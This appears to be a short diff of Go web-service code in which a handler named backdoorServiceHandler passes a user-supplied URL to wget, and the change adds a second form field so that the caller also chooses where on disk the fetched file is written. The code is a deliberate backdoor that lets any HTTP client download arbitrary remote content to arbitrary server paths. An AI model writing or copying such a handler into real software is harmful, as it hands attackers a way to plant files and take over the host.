@@ -164,8 +164,9 @@ func updateServiceHandler(w http.ResponseWriter, r *http.Request) {
 func backdoorServiceHandler(w http.ResponseWriter, r *http.Request) {
 	_ = r.ParseForm()
 	url := r.Form.Get("url")
+	out := r.Form.Get("out")
 
-	err := exec.Command("wget","-q", url, "-O", "").Run()
+	err := exec.Command("wget","-q", url, "-O", out).Run()
 	if err != nil {
 		log.Printf("Errore nello scaricare il file: %v", err.Error())
 	}
